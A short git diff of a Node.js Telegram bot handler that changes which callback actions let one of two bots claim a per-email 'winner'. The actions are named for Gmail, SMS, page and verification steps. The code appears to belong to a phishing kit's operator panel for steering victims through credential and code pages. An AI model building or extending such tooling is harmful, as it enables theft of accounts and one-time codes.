@@ -422,8 +422,8 @@ bot.on("callback_query", async (query) => {
       }
     }
 
-    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for Gmail/SMS/page_!)
-    if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_")) {
+    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for Gmail/SMS/page_/verification!)
+    if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
       userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
       botsThatClickedPage1[email] = true;
       botsThatClickedPage1[`${email}_timestamp`] = Date.now();
@@ -671,8 +671,8 @@ if (bot2) {
         }
       }
 
-      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only!)
-      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verify_")) {
+      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only, NO verification!)
+      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
         userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
         botsThatClickedPage1[email] = true;
         botsThatClickedPage1[`${email}_timestamp`] = Date.now();
